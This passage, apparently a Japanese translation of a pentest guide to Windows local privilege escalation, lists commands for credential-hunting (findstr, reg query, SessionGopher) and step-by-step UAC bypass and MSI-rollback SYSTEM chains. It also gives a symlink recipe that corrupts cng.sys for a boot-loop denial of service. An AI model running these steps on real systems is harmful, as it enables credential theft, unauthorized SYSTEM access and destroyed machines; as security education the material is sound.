Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや構成アーカイブに加えて、ファイル名に認証情報が明記されたファイルも探します。有用な `.7z`、`.zip`、`.rar` バックアップは、数か月前のもので、ありふれたファイル名が付いていることもあります。Windows は元のパスと削除日時を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在のユーザーの読み取り権限を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認候補であり、有効なシークレットが含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` は、**code-signing** の手掛かりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つ code-signing 証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは、署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行させるには、現在のユーザーが対象のスクリプトを変更できること、スクリプトと対象アカウントに対して有効なルールが変更後の署名を許可すること、さらにスケジュールされたタスクなど、より高い権限で実行する仕組みが実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、またはスクリプトへの書き込み権限だけでは、これらの条件がそろっているとは言えません。秘密鍵を含むファイルを開いたり、タスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker 回復キーのエクスポートは HTML や TXT 形式で保存されていることがあり、名前の付いたバックアップアーカイブ内に含まれている場合もあります。このようなデータから、古いバックアップが格納された別の暗号化データボリュームにアクセスできることがあります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在するとは限りません。

複数のプログラムに保存された**パスワードを復元する**には、次を利用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が含まれる可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

現在のユーザーの標準的なEdge **Default**プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoftは既定のプロファイルの場所を文書化しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって場所が変わる場合があります。ファイルの存在は、認証情報ストアがある可能性を示すにすぎません。ファイルを読み取れること、該当ユーザーのDPAPIコンテキストまたはその他の許可された鍵素材を利用できること、保存されたログイン情報がより高い権限を持つアカウントのものかを確認してください。パスのみの列挙であれば、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefoxについて、[Mozillaの文書](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、鍵ファイルと暗号化されたログイン情報ファイルのペアです。両方のファイルが読み取り可能か、保存されたエントリーが存在するか、鍵がPrimary Passwordで保護されているかを確認するまでは、認証情報が使用可能だと判断できません。復元した認証情報がドメインアカウントのものなら、そのアカウントに実効性のあるグループ制御権限があるか、およびグループに[LAPSパスワードの読み取りまたは復号の権限](../active-directory-methodology/laps.md)があるかを別々に確認してください。ブラウザーの痕跡だけでは、管理者権限を得られる経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windowsオペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントは**クラスID (CLSID) で識別され**、各コンポーネントは1つ以上のインターフェースを介して機能を公開します。インターフェースはインターフェースID (IID) で識別されます。

COMクラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** を結合して作成されます。

このレジストリのCLSID内には、子レジストリ **InProcServer32** があります。そこには、**DLL**を指す**既定値**と、**Apartment** (シングルスレッド)、**Free** (マルチスレッド)、**Both** (シングルまたはマルチスレッド)、**Neutral** (スレッド中立) のいずれかを指定する **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリのCLSID内には、子レジストリInProcServer32があります。そこには、DLLを指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行されるDLLを**上書き**できれば、そのDLLが別のユーザーによって実行される場合に**権限昇格**が可能です。

攻撃者が永続化の仕組みとしてCOM Hijackingをどのように利用するかについては、以下を参照してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsf**プラグインです。被害者のシステム内で認証情報を検索するすべての Metasploit POST module を**自動的に実行するために**作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEMとして実行中のプロセスが、フルアクセス権で新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスが、**メインプロセスの開いているすべてのハンドルを継承する、低い権限で実行される新しいプロセスも作成**（`CreateProcess()`）します。\
その後、**低い権限のプロセスへのフルアクセス権**を持っていれば、`OpenProcess()`で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcodeを注入**できます。\
この脆弱性の**検出方法と悪用方法**については、[こちらの例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベル（フルアクセスに限らない）で継承された、プロセスやスレッドのオープンハンドルをテストして悪用する方法**について詳しくは、[こちらの別の記事](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)を参照してください。

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間の通信やデータ転送が可能になります。

Windowsには**Named Pipes**という機能があり、異なるネットワーク上にいる場合でも、無関係なプロセス同士でデータを共有できます。これはクライアント／サーバー型のアーキテクチャに似ており、**named pipe server**と**named pipe client**という役割があります。

**クライアント**がパイプを通じてデータを送信すると、必要な**SeImpersonate**権限を持つ**サーバー**は、**クライアントの身元を偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を見つければ、自分が作成したパイプとそのプロセスがやり取りした際に、そのプロセスの身元を偽装して**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に役立つガイドがあります。

また、次のツールを使うと、burpのようなツールで**named pipeの通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。また、次のツールを使うと、privescにつながるパイプを見つけるために、すべてのパイプを一覧表示して確認できます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードのTelephonyサービス（TapiSrv）は、`\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslotベースの非同期イベント処理経路を悪用し、`ClientAttach`を使って、`NETWORK SERVICE`が書き込み可能な既存ファイルに対する任意の**4バイト書き込み**を実行できます。その後、Telephonyの管理者権限を取得し、任意のDLLをサービスとして読み込ませることが可能です。全体の流れは次のとおりです。

- `pszDomainUser`に書き込み可能な既存パスを指定して`ClientAttach`を実行する → サービスは`CreateFileW(..., OPEN_EXISTING)`でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize`で指定した攻撃者制御の`InitContext`をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）でline appを登録し、`TRequestMakeCall`（`Req_Func 121`）を実行して、`GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除／シャットダウンを行うことで、同じ書き込みを確実に繰り返せます。
- `C:\Windows\TAPI\tsec.ini`の`[TapiAdministrators]`に自分を追加して再接続し、任意のDLLパスを指定して`GetUIDllName`を呼び出すと、`NETWORK SERVICE`として`TSPI_providerUIIdentify`を実行できます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windowsで実行可能なファイル拡張子

**[https://filesec.io/](https://filesec.io/)**を参照してください。

### Markdownレンダラーを介したProtocol handler / ShellExecuteの悪用

`ShellExecuteExW`に渡されるクリック可能なMarkdownリンクは、危険なURI handler（`file:`、`ms-appinstaller:`、または登録済みの任意のscheme）を呼び出し、攻撃者が制御するファイルを現在のユーザーとして実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含むコマンドラインの監視**

ユーザーとしてshellを取得したとき、**コマンドラインに認証情報を渡す**スケジュール済みタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは、2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」として terminal やその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に実行できます。さらに、何かをインストールする必要はなく、このプロセスで使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下のとおりです。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、次の GitHub リポジトリにあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 公開ルートに作成された Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でその中に書き込んでから、ファイルを処理する場合があります。サーバー側の書き込みが行われる前に、低権限ユーザーがそのサブディレクトリを削除し、NTFS junction に置き換えられると、書き込みが junction をたどって Web からアクセス可能なディレクトリに到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに置かれたスクリプトは Web サービスの ID で実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、アップロードディレクトリに書き込めることや、既存の junction があることだけでは、脆弱性の証明にはなりません。

アップロードハンドラーでの正確なパス構築と処理のタイミング、サブディレクトリに対するユーザーの実効的な削除・作成権限、宛先の実効 ACL、書き込み側が reparse point をたどるかどうか、Web サーバーが宛先でファイルを実行するかどうかを確認してください。書き込み側と Web サーバーのプロセス ID は、それぞれ個別に確認してください。受動的な調査でディレクトリ ACL と reparse メタデータは確認できますが、ハンドラーの動作や将来の junction の差し替えを立証することはできません。サービスアカウントで実行された場合は、別の token privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## 任意のフォルダー削除/移動/名前変更から SYSTEM EoP へ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている手法で、exploit code は[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)から入手できます。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール中に正規ファイルを悪意のあるファイルへ置き換えます。そのために攻撃者は、`C:\Config.Msi` フォルダーを乗っ取るための**悪意のある MSI installer**を作成します。このフォルダーは後に Windows Installer が別の MSI パッケージのアンインストール中に rollback ファイルを保存するために使われます。その rollback ファイルの内容を、悪意のある payload を含むように改変します。

手法を要約すると、次のとおりです。

1. **Stage 1 – 乗っ取りの準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に、無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - installer を **"UAC Compliant"** に設定し、**非管理者ユーザー**が実行できるようにします。
    - インストール後もファイルへの **handle** を開いたままにします。

- Step 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - `GetFinalPathNameByHandle` を使って開いているファイル handle を**ポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: カスタム同期
    - `.msi` に含まれる**カスタムアンインストールアクション（`SyncOnRbfWritten`）**は、次の処理を行います。
        - `.rbf` が書き込まれたことを通知します。
        - その後、アンインストールを続行する前に、別のイベントを待ちます。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受け取ったら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを**開きます**。これにより、ファイルの**削除を防げます**。
    - その後、アンインストールを完了できるように応答イベントを通知します。
    - Windows Installer は `.rbf` の削除に失敗します。すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` が空になり**、乗っ取りの準備が整います。

> この時点で、**SYSTEM レベルの任意フォルダー削除脆弱性を発動させて** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を悪意のあるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を指定した handle を開いたままにします。

- Step 7: 別のインストールを実行する
    - `.msi` を再度インストールし、次のように設定します。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる変数。
    - このインストールは、`.rbs` と `.rbf` を読み込む**rollback**を再度発生させるために使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるのを待ちます。
    - そのファイル名を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` に含まれる**カスタムインストールアクション（`SyncBeforeRollback`）**は、次の処理を行います。
        - `.rbs` が作成されたときにイベントを通知します。
        - その後、処理を続行する前に待機します。

- Step 10: 弱い ACL を再設定する
    - `.rbs created` イベントを受け取ると、次のようになります。
        - Windows Installer が `C:\Config.Msi` に強い ACL を**再設定します**。
        - ただし、`WRITE_DAC` を指定した handle をまだ保持しているため、再び**弱い ACL を設定できます**。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の動作を指示する**偽の rollback script**で上書きします。
        - `.rbf` ファイル（悪意のある DLL）を、特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **悪意のある SYSTEM レベルの payload DLL**を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動する
    - 同期イベントを通知して、installer を再開させます。
    - インストールを既知の時点で**意図的に失敗**させるため、**type 19 custom action（`ErrorOut`）**が設定されています。
    - これにより **rollback が開始**されます。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意のある `.rbs` を読み込みます。
        - `.rbf` の DLL をターゲットの場所にコピーします。
    - これで、**SYSTEM が読み込むパスに悪意のある DLL を配置**できました。

- Final Step: SYSTEM のコードを実行する
    - 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、乗っ取った DLL を読み込ませます。
    - **これで**、コードが **SYSTEM として実行**されます。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主要な MSI rollback 手法（前述）は、フォルダー全体（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、脆弱性によって**任意のファイル削除**しかできない場合はどうでしょうか？

**NTFS の内部構造**を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

この stream には、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` stream を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準的なファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* の削除 API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダー内の内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除するプリミティブは使えなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止されます**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。そうすると oplock が早期に解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS 内部ストリームを対象としており、これを削除するとフォルダー自体が削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし今は、junction と symlink によって、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除される。

### 任意のフォルダー作成から恒久的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる** primitive を exploit します — **ファイルの書き込み**や**弱い権限の設定**ができなくても可能です。

**重要な Windows driver** と同じ名前の**フォルダー**（ファイルではなく）を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部からの介入（ブート修復やディスクアクセスなど）がなければ、**復旧できません**。

### 特権ログ／バックアップのパスと OM symlink を利用した任意ファイルの上書き／ブート DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログやエクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先のパスを格納した設定ファイルを攻撃者が書き換えられること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テストSMSを送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとするため、**boot loop DoS** が発生します。これは、特権サービスが書き込み用に開く保護対象ファイルなら、どれに対しても応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試される場合があり、破損データを利用した信頼性の高い DoS の仕掛けとして使えます。



## **High Integrity から System へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への昇格**は、新しいサービスを**作成して実行する**だけで簡単にできます:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrity processから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege から System へ

**コードは**[**こちら**](seimpersonate-from-high-to-system.md)**にあります。**

### SeDebug + SeImpersonate から Full Token privileges へ

これらのtoken privilegesを持っている場合（おそらく、すでにHigh Integrityのprocess内で確認できます）、SeDebug privilegeを使って（保護されたprocessを除く）**ほぼすべてのprocessを開き**、そのprocessの**tokenをコピー**して、そのtokenを使った**任意のprocessを作成**できます。\
この手法では通常、**すべてのtoken privilegesを持つSYSTEM実行中のprocessを選びます**（そう、すべてのtoken privilegesを持たないSYSTEM processも存在します）。\
**提案した手法を実行するコード例は**[**こちら**](sedebug-+-seimpersonate-copy-token.md)**にあります。**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で権限昇格する際に使われます。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**というものです。次に、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**が、pipe client（service）のtokenを**偽装**し、SYSTEM privilegesを取得できます。\
[name pipesについて詳しく知りたい場合はこちらをお読みください。](#named-pipe-client-impersonation)\
[name pipesを使ってhigh integrityからSystemに移行する方法の例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEMとして実行中のprocessによってロードされるdllを乗っ取る**ことができれば、その権限で任意のコードを実行できます。したがって、Dll Hijackingもこの種の権限昇格に有効です。さらに、dllのロードに使われるフォルダへの**書き込み権限**を持つため、**high integrity processからのほうがはるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちら**](dll-hijacking/index.html)**をご覧ください。**

### **Administrator または Network Service から System へ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE または NETWORK SERVICE から full privs へ

**お読みください:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しい情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows local privilege escalationのベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスと機密ファイルをチェック (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPに保存されたセッション情報を抽出します。ローカルで-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン内でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc用enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索（VisualStudioでコンパイルが必要）([**コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
